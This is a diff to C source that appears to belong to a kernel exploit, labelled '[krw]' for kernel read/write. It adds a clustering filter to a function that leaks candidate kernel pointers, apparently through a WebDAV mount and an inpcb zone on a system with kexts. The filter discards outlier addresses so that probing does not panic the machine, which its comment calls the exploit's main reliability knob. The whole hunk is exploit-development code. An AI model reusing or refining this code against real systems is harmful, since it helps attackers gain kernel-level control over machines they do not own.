@@ -616,6 +616,43 @@ wdav_leak_candidates(const char *server, const char *mnt,
         cand[ncand++] = v;
     }
     fprintf(stderr, "[krw] %zu unique candidate pointers\n", ncand);
+
+    /* Clustering filter: inpcb zone elements cluster tightly, so drop
+     * outliers far from the median.  Probing an unmapped candidate faults
+     * inside the kext (lease-key compare) and panics the box -- this is
+     * the main reliability knob. */
+    if (ncand > 8) {
+        uint64_t *sorted = malloc(ncand * sizeof(uint64_t));
+        if (sorted != NULL) {
+            size_t kept = 0;
+            uint64_t median, lo, hi;
+            memcpy(sorted, cand, ncand * sizeof(uint64_t));
+            /* insertion sort is fine for a few thousand entries */
+            for (size_t a = 1; a < ncand; a++) {
+                uint64_t x = sorted[a];
+                ssize_t b = (ssize_t)a - 1;
+                while (b >= 0 && sorted[b] > x) {
+                    sorted[b + 1] = sorted[b];
+                    b--;
+                }
+                sorted[b + 1] = x;
+            }
+            median = sorted[ncand / 2];
+            free(sorted);
+            lo = median - 0x10000000ULL;    /* +/- 256 MB */
+            hi = median + 0x10000000ULL;
+            for (size_t a = 0; a < ncand; a++) {
+                if (cand[a] >= lo && cand[a] <= hi)
+                    cand[kept++] = cand[a];
+            }
+            fprintf(stderr, "[krw] clustering: %zu -> %zu candidates "
+                    "(median 0x%llx)\n", ncand, kept,
+                    (unsigned long long)median);
+            ncand = kept;
+            if (ncand == 0)
+                goto out;
+        }
+    }
     rc = 0;
 
 out:
